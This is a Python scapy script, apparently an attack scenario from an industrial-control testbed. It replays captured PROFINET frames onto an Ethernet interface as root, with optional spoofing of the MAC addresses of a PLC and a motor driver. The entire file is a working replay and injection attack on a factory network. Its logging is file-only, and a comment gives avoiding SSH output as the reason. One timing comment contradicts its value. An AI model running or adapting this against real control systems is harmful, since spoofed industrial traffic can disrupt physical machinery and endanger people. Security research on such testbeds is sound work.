# Seventh Scenario: Injection of a longer segment of previously captured normal traffic

import os
import sys
import time
import logging
from scapy.all import Ether, rdpcap, sendp, conf

# ----- CONFIG -----
IFACE = "eth0"

# Only needed if I want to rewrite MACs; otherwise original MACs are kept
SRC_MAC = "30:b8:51:03:21:a2"    # MAC Address PLC
DST_MAC = "00:0d:1e:1c:64:32"    # MAC Address Motor Deiver

PCAP_SOURCE = "/home/mhamadsend/pcaps/capture1.pcap" # captured file of normal traffic
REPEAT = 1

USE_ORIGINAL_TIMING = False        # <<< turn this OFF
FIX_MACS = False

SEND_INTERVAL = 0.00148            # 2 ms per packet  500 pps

LOG_FILE = "/tmp/layer2_replay.log"
VERBOSE_PROGRESS = True
# -------------------

# Log ONLY to file (no StreamHandler -> no SSH spam)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE)
    ]
)
logger = logging.getLogger("layer2_replay")


def load_profinet_packets(pcap_path):
    """Load packets from pcap and keep only PROFINET (eth.type == 0x8892)."""
    all_pkts = rdpcap(pcap_path)
    pn_pkts = [
        p for p in all_pkts
        if p.haslayer(Ether) and p[Ether].type == 0x8892
    ]
    return pn_pkts


def maybe_fix_macs(pkt):
    """Optionally rewrite src/dst MACs to our configured ones."""
    if not pkt.haslayer(Ether):
        return pkt
    p = pkt.copy()
    if SRC_MAC:
        p[Ether].src = SRC_MAC
    if DST_MAC:
        p[Ether].dst = DST_MAC
    return p


def replay_with_original_timing(pkts):
    """Replay packets, preserving relative timing from the pcap."""
    if not pkts:
        logger.warning("No packets to send.")
        return

    first = pkts[0]
    prev_time = float(first.time)
    sendp(first, iface=IFACE, verbose=False)

    for i, pkt in enumerate(pkts[1:], start=2):
        current_time = float(pkt.time)
        gap = current_time - prev_time
        if gap > 0:
            time.sleep(gap)
        sendp(pkt, iface=IFACE, verbose=False)
        prev_time = current_time

        if VERBOSE_PROGRESS and (i % 1000 == 0):
            logger.info(f"Replayed {i}/{len(pkts)} packets")


def replay_without_timing(pkts, inter=0.0):
    """Replay packets as fast as possible or with a fixed inter delay."""
    # sendp handles the loop efficiently in C
    sendp(pkts, iface=IFACE, inter=inter, verbose=False)


def main():
    if os.geteuid() != 0:
        logger.error("This script must be run as root (sudo). Exiting.")
        sys.exit(1)

    logger.info(f"Interface: {IFACE}")
    logger.info(f"Loading pcap: {PCAP_SOURCE}")
    conf.iface = IFACE

    pkts = load_profinet_packets(PCAP_SOURCE)
    if FIX_MACS:
        pkts = [maybe_fix_macs(p) for p in pkts]

    logger.info(f"Loaded {len(pkts)} PROFINET packets from pcap")

    if not pkts:
        logger.error("No PROFINET packets found in pcap. Exiting.")
        sys.exit(1)

    for r in range(REPEAT):
        logger.info(f"Replay round {r+1}/{REPEAT} starting...")
        if USE_ORIGINAL_TIMING:
            replay_with_original_timing(pkts)
        else:
            replay_without_timing(pkts, inter=SEND_INTERVAL)
        logger.info(f"Replay round {r+1}/{REPEAT} finished")

    logger.info("All replays done.")


if __name__ == "__main__":
    main()